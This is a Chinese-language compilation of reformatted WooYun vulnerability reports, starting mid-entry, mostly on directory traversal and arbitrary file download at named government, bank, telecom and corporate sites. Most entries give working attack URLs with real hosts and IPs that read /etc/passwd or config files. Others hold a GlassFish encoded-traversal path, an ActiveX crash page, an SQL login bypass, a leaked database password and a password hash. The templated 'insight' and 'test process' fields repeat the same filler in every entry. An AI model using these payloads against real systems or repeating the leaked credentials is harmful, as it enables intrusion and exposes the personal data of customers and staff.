**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2011-02279] 土豆网目录遍历（貌似是worepress）
**厂商**: 土豆网 | **年份**: 2011 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 土豆网目录遍历（貌似是worepress）插入图片地址：

**POC**: 土豆目录遍历漏洞。URL：http://blog.tudou.com/wp-includes/http://blog.tudou.com/wp-content/themes/default/images/http://blog.tudou.com/wp-content/uploads/http://blog.tudou.com/wp-content/plugins/google-analyticator/http://blog.tudou.com/wp-content/uploads/http://blog.tudou.com/wp-content/themes/default/images/

**绕过**: 直接利用

**修复**: 请自行修复，方法：设置权限等
---

---
### [wooyun-2012-08459] 东方购物网上商城目录遍历数据库密码泄露服务器信息泄露
**厂商**: 东方购物 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 商城目录遍历数据库密码泄露服务器信息泄露

**POC**: 商城目录遍历数据库密码泄露db_host = pudongdb_user = ocj_userdb_password = j83f8udb_name = ocj_shopping服务器信息泄露Server Version: Apache/2.2.17 (Unix) mod_fcgid/2.3.5Server Built: Mar 25 2011 14:41:17Server loaded APR Version: 1.4.2Compiled with APR Version: 1.4.2Server loaded APU Version: 1.3.10Compiled with APU Ver

**绕过**: 直接利用

**修复**: 你们比哥专业!
---

---
### [wooyun-2012-08313] 某地方税务局目录遍历漏洞
**厂商**: 某地方税务局 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某地方税务局存在编辑器漏洞导致遍历目录

**POC**: http://www.fj-l-tax.gov.cn:7003/TaxWeb/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../存在fckeditor导致可以遍历目录 导致后台泄漏http://www.fj-l-tax.gov.cn:7003/TaxWeb/cms   导致注入出来的密码可以有用武之地而登陆后台  可进行下一步的渗透http://www.fj-l-tax.gov.cn:7003/TaxWeb

**绕过**: 直接利用

**修复**: 升级高版本fckeditor 并将后台地址修改的不容易猜到。。
---

---
### [wooyun-2015-0130118] 奥鹏教育网分站几处问题打包
**厂商**: open.com.cn | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://eduadminnew.open.com.cn/Public/   目录遍历http://eduadminnew.open.com.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/   目录遍历,学生身份信息泄露，详细目录：http://eduadminnew.open.com.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/BillMode/Temp/    http://eduadminnew.open.com.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/BillMode/http://eduadmin.open.com.cn/  OES系统目录遍历,泄露数据库账号密码http:

**POC**: http://scm.open.com.cn/public/  目录遍历http://115.182.41.203:8080/Home/Login  万能密码登陆疑似影响各个分站后台登陆，我不小心吧第一个北京的密码重置了  =_=|||http://115.182.41.191/    maven仓库http://115.182.41.175/PC-login.html?url=/PC-resource-index.html  登陆处疑似注入，因为加个单引号回显不同。

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2013-042450] TOM在线分站漏洞小礼包
**厂商**: TOM在线 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 分站是这个http://vote.sports.tom.com第一弹，resin配置漏洞http://vote.sports.tom.com/votecode/%3f.jsp可列目录：第二弹 resin任意文件读取http://vote.sports.tom.com/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/web.xml第三弹  .bash_history .viminfo等泄露http://vote.sports.tom.com/.viminfohttp://vote.sports.tom.com/.bash_history黑客 可以通过搜集这些小漏洞 进行进一步的攻击

**POC**: 分站是这个http://vote.sports.tom.com第一弹，resin配置漏洞http://vote.sports.tom.com/votecode/%3f.jsp可列目录：第二弹 resin任意文件读取http://vote.sports.tom.com/resin-doc/viewfile/?contextpath=/&servletpath=&file=WEB-INF/web.xml第三弹  .bash_history .viminfo等泄露http://vote.sports.tom.com/.viminfohttp://vote.sports.tom.com/.bash_h

**绕过**: 直接利用

**修复**: 你们知道的
---

---
### [wooyun-2016-0168979] 金逸影城目录遍历导致员工信息泄漏
**厂商**: 广州金逸影城有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:9080/imageFiles/有很多这样的txt文件

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你说呢~~
---

---
### [wooyun-2013-032793] 江苏某银行客户申请文件下载（泄漏客户贷款信息）
**厂商**: 江苏某银行 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 有目录遍历，有phpinfo，可找到管理员登录界面。有管理员帐号密码明文保存在txt，不过无法登陆。关键是可以下载银行贷款人信息（包括贷款金额，姓名，身份证号，家庭地址，手机号码，固定电话等敏感信息）。

**POC**: http://218.92.161.201/dksq/http://218.92.161.201/dksq/login.phphttp://218.92.161.201/dksq/mima.txthttp://218.92.161.201/?phpinfo=1http://218.92.161.201/dksq/orders/

**绕过**: 直接利用

**修复**: 你们都懂，我不懂
---

---
### [wooyun-2013-020367] 百度某应用任意文件读取问题！
**厂商**: 百度 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 让哥激动了一下，url跳转的漏洞可能没写好或部署目录限制，好象只能在本应用目录内读取！

**POC**: http://tongxue.baidu.com/CorpLoginAction.do?cmd=logoutCorp&toUrl=/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 在想开发人员是如何实现这个一奇葩url跳转的设计的（也不是文件下载啊！如果方便构造漏洞的方法告诉我一下！）？其他类似的地方自己也复查一下！
---

---
### [wooyun-2011-01481] 皮皮播放器Activex存在远程拒绝服务漏洞
**厂商**: 皮皮网 | **年份**: 2011 | **类型**: 拒绝服务

**元思考**: 触发信号: 功能测试

**洞察**: 拒绝服务防护不足，开发者信任前端输入

**测试流程**:
1. 识别拒绝服务相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 皮皮播放器PIPIWebPlayer.ocx文件中PlayLocalFilm()函数未对传递的文件进行有效性检查，当传递一个已经存在本地非视频文件名给PlayLocalFilm时候，IE会出现异崩溃，造成拒绝服务攻击。

**POC**: <HTML><HEAD><BODY>Test Exploit page<OBJECT id=target classid=clsid:A74BF134-5213-46B5-AF36-CE1888315DC7></OBJECT><SCRIPT language=vbscript>arg1="c:\boot.ini"target.PlayLocalFilm arg1</SCRIPT></BODY></HTML>

**绕过**: 直接利用

**修复**: 对xxx进行有效性进行验证，或者。。。。
---

---
### [wooyun-2016-0169925] 金蝶友商在线客服存在任意文件下载漏洞
**厂商**: 金蝶 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 打开链接：http://im.youshang.com/live800/downlog.jsp?path=/&fileName=/etc/passwd可以下载passwd文件，内容如下：root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/s

**POC**: 打开链接：http://im.youshang.com/live800/downlog.jsp?path=/&fileName=/etc/passwd可以下载passwd文件，内容如下：root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2015-0136374] 中海达某设备产品存在设计缺陷(可导致敏感信息泄漏包括账号密码)
**厂商**: 广州中海达卫星导航技术股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题产品存在目录遍历，从WooYun-2015-136143已知产品是使用SQLite数据库，从目录遍历发现管理员账号密码存储在这个位置“browse/browse_user_db.php”而且密码为普通的md5加密可破解。Index of /browseParent Directorybrowse_ant_db.phpbrowse_data_db.phpbrowse_ellipsoid_db.phpbrowse_user_db.phpindex.htmIndex of /buildParent DirectoryEllipsoid.csvantenna.txtbuild_ant_db.phpbuild_data_db.phpbuild_ellipsoid_db.phpbuild_log_db.phpbuild_url_db.phpbuild_usr_db.phpdb.txtdb.txt.

**POC**: 案例：**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**:8000/**.**.**.**/**.**.**.**/**.**.**.**:8080/**.**.**.**:8000/**.**.**.**:8000/build/**.**.**.**/**.**.**.**/**.**.**.**:8000/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**.**.**.**/**

**绕过**: 直接利用

**修复**: 联系厂商
---

---
### [wooyun-2013-022233] 泡泡网主站多处安全漏洞
**厂商**: IT168.com | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 信息泄露：Warning: file_get_contents(http://api.tudou.com/v3/gw?method=item.info.get&appKey=6fd4fe7743861fad&format=json&itemCodes=145934359) [function.file-get-contents]: failed to open stream: HTTP request failed! HTTP/1.1 403 Forbidden in /data/v/test.php on line 2NULLhttp://v.it168.com/test.phphttp://v.it168.com/phpinfo.php后台越权访问：http://used.it168.com/manager/manager.asphttp://used.it168.com/manage

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 去睡觉了 建议乌云加个修改功能以后可以补东西的！
---

---
### [wooyun-2014-077280] 某酒店系统后台验证不严导致多家星级酒店可查开房记录
**厂商**: 广州市问途信息技术有限公司 | **年份**: 2014 | **类型**: 非授权访问/权限绕过

**元思考**: 触发信号: 后台管理

**洞察**: 非授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、使用问途酒店网络营销系统的酒店均存在目录遍历和后台验证不严的漏洞，问途官网网址：http://www.wintour.cn2、后台验证不严举例酒店河源翔丰国际酒店，网站后台地址：http://www.xfi-hotel.com/admin后台页面虽然做了js的跳转，仅仅这样根本挡不住，阻止js跳转后，即可显示并操作后台管理页面，如下图：不想被查水表啊，开房记录我就不查了，先看看会员吧。如下图：生意好像不怎么样，来看一家生意好的，如下图：3、目录遍历举例4、受影响的酒店百度的结果如下图：至于是不是只有这几家酒店受影响，这个得看使用问途的酒店有多少家了。随便搜索了一下，发现如下几家星级酒店均存在上述漏洞。翔丰国际酒店  http://www.xfi-hotel.com/广永丽都酒店  http://www.lido-hotel.cn/临番禺宾馆    http://www.panyuhot

**POC**: 同上。

**绕过**: 直接利用

**修复**: 找问途吧。开房真不让人放心。。
---

---
### [wooyun-2013-017974] 中国商务部配额许可证事务局数据库文件泄露
**厂商**: 中国商务部配额许可证事务局 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 运行于web服务器的8080端口允许目录遍历，且存在程序及数据库备份文件可被任何人下载非法利用。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、修改apache配置文件，不允许列目录。2、关闭不需要对外发布的端口及应用.
---

---
### [wooyun-2015-0164624] 臺東縣政府教育處某站任意文件下载（臺灣地區）
**厂商**: 臺東縣政府 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: **.**.**.**/data.php?file=../../../etc/passwd

**POC**: **.**.**.**/data.php?file=../../../etc/**.**.**.**f

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2014-061766] 沈阳工业大学网站目录任意文件下载
**厂商**: 沈阳工业大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://xsc.sut.edu.cn/admin/

**绕过**: 直接利用

**修复**: 你们比我更专业。。。。这漏洞就不用我说怎么修复了。
---

---
### [wooyun-2015-0124203] 浙商保险某保单管理系统存在任意文件下载漏洞
**厂商**: 浙商财产保险 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浙商卡式保单管理系统http://activecard.zsins.com:7011/iss_dbwebins/bs/bsPrdController.do?method=getPrdouKindList右键图片得到问题链接http://activecard.zsins.com:7011/iss_dbwebins/servlet/FileLookServlet?upfileurl=/home/weblogic/webapps/ZheShang/image/6007.jpg构造一下http://activecard.zsins.com:7011/iss_dbwebins/servlet/FileLookServlet?upfileurl=/etc/passwd

**POC**: http://activecard.zsins.com:7011/iss_dbwebins/servlet/FileLookServlet?upfileurl=/etc/hosts

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-057293] 搜狐焦点后台越权访问&目录遍历
**厂商**: 搜狐 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，目录遍历http://blogimg.focus.cn/common/泄露一些敏感信息，包括一些管理后台搜狐焦点后台管理员登录http://dev.focus.cn/common/admin/admin_login.php?ru=http://blogimg.focus.cn/common/crm/管理后台http://blogimg.focus.cn/common/admin/admin_login.php系统集成管理后台http://blogimg.focus.cn/common/app/?m=admin&c=app_admin&a=loginhttp://blogimg.focus.cn/common/loupan/admin_header.php搜狐焦点后台http://blogimg.focus.cn/common/loupan/investment/http://blogi

**POC**: 上面

**绕过**: 直接利用

**修复**: 控制访问权限。
---

---
### [wooyun-2015-0110843] 链家某后台业务系统一处任意文件读取
**厂商**: homelink.com.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://119.254.70.76POST /?_p=../../../../../etc/passwd%00.jpg HTTP/1.1Host: 119.254.70.76User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/20100101 Firefox/22.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://119.254.70.76/?_p=login&msg=%E7%94%A8%E6%88%B7%E5%90%8D%E6%88%96

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-02378] 华商网 投票系统设计缺陷
**厂商**: 华商网 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 专题地址：http://health.hsw.cn/system/2011/05/11/050936197.shtmlfirame嵌入投票地址：http://toupiao.hsw.cn/fangchan/index_all.php?table=109&n=75&width=125&height=160&s=5&widths=900投票已代码里的一个code，及本地js判断cookie限制，系统虚设。一个简单的多线程就能在几分钟内头上上万票。

**POC**: 上面的投票基本多少在几分钟内跑出来的。测试的部分scala代码(自己封装的一个httpclient类)：val header = HttpClientService.getDefaultHeaderheader += (("Referer", "http://toupiao.hsw.cn/fangchan/index_all.php?table=109&n=75&width=125&height=160&s=5&widths=900"))val mybreaks = new scala.util.control.Breaksimport mybreaks.{break, breakable}v

**绕过**: 直接利用

**修复**: 1.投票加ip限制2.加用户登录及用户投票数限制3.复杂的验证码4.php内使用memcache的add方法，数据库唯一索引等防止并发
---

---
### [wooyun-2014-081560] 某政府网站任意文件下载
**厂商**: 某政府网站 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.qdzjj.gov.cn/download.php?path=download.php<?php$path = $_GET['path'];if(!empty($path) and !is_null($path)){$filename=$path;$file=fopen($path,"r");header("Content-type:application/octet-stream");header("Accept-ranges:bytes");header("Accept-length:".filesize($path));header("Content-Disposition:attachment;filename=".$filename);echo fread($file,filesize($path));fclose($file);exit;}?>$ mysq

**POC**: 同上详细说明

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0101813] 广州证券某站任意文件下载
**厂商**: 广州证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 广州证券同花顺新版手机炒股网站存在任意文件下载下载passwdhttp://113.108.129.142/dlarea/download.php?fn=../../../../../../../../../../etc/passwd&bid=74&bname=%E5%BA%B7%E4%BD%B3&mid=1633&mname=D580root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdow

**POC**: 如上

**绕过**: 直接利用

**修复**: 控制权限
---

---
### [wooyun-2016-0178322] 江苏电力设计院某系统任意文件读取
**厂商**: 国家电网公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://218.94.40.6:8080/hrss/rm/RmMain.jsp?dsName=ncdlhttp://218.94.40.6:8080/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xmloracle数据库

**POC**: 地址：http://218.94.40.6:8080/hrss/rm/RmMain.jsp?dsName=ncdlhttp://218.94.40.6:8080/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xmloracle数据库

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0130629] 移动某站存在目录遍历漏洞可浏览服务器敏感信息
**厂商**: 中国移动集团公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国移动mobile market应用搜索平台存在目录遍历漏洞可浏览服务器敏感信息http://ma.mmarket.com/

**POC**: 遍历地址：http://ma.mmarket.com/wxdl.php?wx=not&pv=../../../../../../../../../../../../../sbin/../etc/passwd通过遍历可读到passwd信息在burpsuit中加个字典跑一下，可以读取到php和mysql的相关配置信息还能读到系统的协议信息，环境变量和网络配置等相关信息

**绕过**: 直接利用

**修复**: 做好目录权限控制
---

---
### [wooyun-2015-096207] 国家旅游局某系统未授权访问
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题所在系统：http://daoyou-chaxun.cnta.gov.cn/ 登陆处存在漏洞，可使用’or 1=1 登陆。可查看70w导游信息。登录进去时账号显示为某省某市的账号，好像该账号权限只能查询本市的基本信息，但可以直接退回上级目录，跳到首页可以查看全国信息。如果权限设定确实这样，那系统存在严重的目录遍历问题。

**POC**: 问题所在系统：http://daoyou-chaxun.cnta.gov.cn/ 登陆处存在漏洞，可使用’or 1=1 登陆。可查看70w导游信息。登录进去时账号显示为某省某市的账号，好像该账号权限只能查询本市的基本信息，但可以直接退回上级目录，跳到首页可以查看全国信息。如果权限设定确实只能查看本市信息，那系统存在严重的目录遍历问题。

**绕过**: 直接利用

**修复**: 系统确实年代有些久了,可以考虑查查漏洞。
---

---
### [wooyun-2013-022904] 某市某工商分局任意文件下载及后台数据库劫持
**厂商**: 宁波市某工商分局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 宁波市工商分局大榭开发区分局文件下载功能由于过滤不严格，可任意下载网站源文件。通过分析，成功劫持后台数据库并取得网站管理员权限

**POC**: 本次渗透纯属实验性质，并无恶意。也未破坏任何数据。下载点：http://www.dx315.gov.cn/download.asp?v=upload/doc/../../download.asp通过分析download.asp,发现这个下载点有过滤行为===============================================================if filename="" and instr(filename,"upload")=0  thenresponse.write "<script language='javascript'>alert('下载文件时参数

**绕过**: 直接利用

**修复**: 1,http://www.dx315.gov.cn/download.asp中做完备的过滤，或者不要这个下载asp了.比方说下载http://www.dx315.gov.cn/download.asp?v=upload/doc/2012215103123195.doc， 直接http://www.d
---

---
### [wooyun-2015-0151957] 某市软件评测中心目录遍历漏洞
**厂商**: 上海市软件评测中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站报告系统目录遍历，内部资料泄露。

**POC**: 网站报告系统目录遍历，内部资料泄露。

**绕过**: 直接利用

**修复**: 如图，禁用目录遍历。
---

---
### [wooyun-2013-024621] 上海地铁任意文件下载漏洞
**厂商**: 上海地铁 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址:http://eps.shmetro.com/ieps/DispatchAction.do?efFormEname=DXPS0001&serviceName=DXPS0001修改下载按钮对应的源代码可下灾任意文件.

**POC**: root:WFJ7.qUDeHSJo:0:3::/:/sbin/shdaemon:*:1:5::/:/sbin/shbin:*:2:2::/usr/bin:/sbin/shsys:*:3:3::/:adm:*:4:4::/var/adm:/sbin/shuucp:*:5:3::/var/spool/uucppublic:/usr/lbin/uucp/uucicolp:*:9:7::/var/spool/lp:/sbin/shnuucp:*:11:11::/var/spool/uucppublic:/usr/lbin/uucp/uucicohpdb:*:27:1:ALLBASE:/:/sbin/

**绕过**: 直接利用

**修复**: 你懂的.
---

---
### [wooyun-2015-0115003] 中国移动和游戏接入平台越权查看/修改他人应用+任意文件读取
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 平台地址：https://igop.cmgame.com:7443/cas/login[任意文件读取]：登录后点击“游戏管理”-“游戏信息”，上传图片后可以获得该链接：http://igop.cmgame.com:38086/pop/content/createImage2page.action?localPath=https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20150515/131558/40947/icon/1431666936394.jpg修改其中的文件地址，可读取任意文件。[越权查看/修改他人应用]：我们先确认下当前帐号只有一个游戏：登录后点击“我的待办”，点击“处理”按钮，得到如下链接：http://igop.cmgame.com:38086/pop/content/modifyGameMyWork.action?c

**POC**: passwd:root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/falsedaemon:x:2:2:Daemon:/sbin:/bin/falselp:x:4:7:Printing daemon:/var/spool/lpd:/bin/falsemail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falsegames:x:12:100:Games account:/var/games:/bin/falsewwwrun:x:30:8:WWW daemon apache:/var/

**绕过**: 直接利用

**修复**: :)
---

---
### [wooyun-2016-0183181] pps分站一处GlassFish任意文件读取
**厂商**: PPS网络电视 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mask 区域*****90.1**********ost*****1.://**.**.**//58.83.190.177:4848//theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts</code>_*****288201dd45b242c2869b.png&qu********************68f19de1f497742d7bdc.png&qu******************** following line,**********functionalit**********stream.com	localhos***

**POC**: 58.83.190.177etc/hostshttps://58.83.190.177:4848//theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts# Do not remove the following line, or various programs# that require network functionality will

**绕过**: 直接利用

**修复**: glassfish任意文件读取
---

---
### [wooyun-2014-076878] 中望软件系统任意文件下载
**厂商**: zwcad.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可任意下载文件

**POC**: config文件web.xml文件

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2014-069415] 哈尔滨市行政审批管理平台权限设置不严谨及业务逻辑漏洞
**厂商**: hrbxzsp.gov.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 貌似有两个版本的网站，分别为：http://www.hrbxzsp.gov.cn/www_web/index.jsphttp://www.hrbxzsp.gov.cn:8080/template/yindao.htm找到文件下载的相关链接：http://www.hrbxzsp.gov.cn/viewggl.jsp?nid=126342http://www.hrbxzsp.gov.cn:8080/template/zxbs/zxbs_bgxz_list.jsp查看页面代码如下图：可以推测目前两个网站都在同一个服务器且容器不同，JBOOS和Tomcat。根据下载的URL构造遍历的链接，先找web.xmlhttp://www.hrbxzsp.gov.cn:8080/fileFetcherServlet?filePath=E:\hrbweb\WebRoot\WEB-INF\web.xmlhttp:

